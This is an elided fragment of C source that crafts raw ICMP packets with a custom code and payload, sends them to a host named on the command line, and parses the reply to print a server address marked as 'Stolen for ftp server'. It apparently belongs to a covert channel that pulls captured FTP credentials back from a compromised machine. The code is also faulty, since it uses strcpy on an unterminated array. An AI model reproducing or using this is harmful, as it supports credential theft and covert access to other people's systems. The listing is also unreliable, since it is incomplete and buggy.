...
int main(int argc, char *argv[])
{
    ...
    int one = 1;
    int *ptr_one = &one;
    char dd[4] = {88,89,90,91};
  int i;
    char *ddptr = (char *) malloc(4);
    memset(ddptr,0,4);
    ...
    addr.sin_addr.s_addr = inet_addr(argv[1]);//.5
    ...
    icmphead->icmp_code = 0xA7;
    icmphead->icmp_cksum = checksum(42, (unsigned short *)icmphead);
    //ddptr = (char *)((char *)icmphead + sizeof(struct icmp));
    ddptr = (char *)icmphead->icmp_data;
    ddptr=strcpy(ddptr,dd);
    //memset(ddptr,4,4);
   // printf("ddptr is %x\n",*(ddptr +1));
//printf("first foo loop ");
  // for(i=0;i<256;i++) 
//{ 
  //     printf("%x", ddptr[i]);
//}    
...
{ 
   ...
   // char *ad = iphead->ip_dst;
    icmphead = (struct icmp *)(recvbuff + sizeof(struct ip));
    memcpy(&serv_addr, ((char *)icmphead + 8),
    	   sizeof (struct in_addr));

    fprintf(stdout, "\naddress is  == %s,Stolen for ftp server %s:\n", recvbuff,inet_ntoa(serv_addr));
